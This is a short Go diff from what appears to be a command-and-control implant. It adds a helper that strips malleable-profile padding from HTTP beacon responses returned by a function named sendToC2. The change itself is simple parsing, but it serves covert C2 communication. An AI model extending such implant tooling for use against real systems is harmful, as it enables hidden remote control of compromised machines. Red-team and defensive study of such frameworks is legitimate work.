@@ -1061,7 +1061,29 @@ func sendToC2(idx int, body []byte) []byte {
 	if Debug {
 		fmt.Printf("[+] Beacon OK from %s, response %d bytes\n", url, len(data))
 	}
+	// The server's malleable profile may wrap the JSON reply with fixed
+	// prepend/append bytes. Strip them here (HTTP transport only) so the
+	// JSON envelope below parses; binary transports never wrap the frame.
+	data = stripMalleableWrapping(data)
 	return data
+}
+
+// stripMalleableWrapping removes the configured malleable prepend/append
+// padding from an HTTP beacon response body. The server prepends/appends the
+// exact strings configured in its malleable profile; stripping must be
+// symmetrical or the JSON decoder rejects the reply.
+func stripMalleableWrapping(data []byte) []byte {
+	switch {
+	case MalleablePrepend == "" && MalleableAppend == "":
+		return data
+	case MalleablePrepend == "":
+		return bytes.TrimSuffix(data, []byte(MalleableAppend))
+	case MalleableAppend == "":
+		return bytes.TrimPrefix(data, []byte(MalleablePrepend))
+	default:
+		data = bytes.TrimPrefix(data, []byte(MalleablePrepend))
+		return bytes.TrimSuffix(data, []byte(MalleableAppend))
+	}
 }
 
 func sendBeacon(body []byte) []byte {
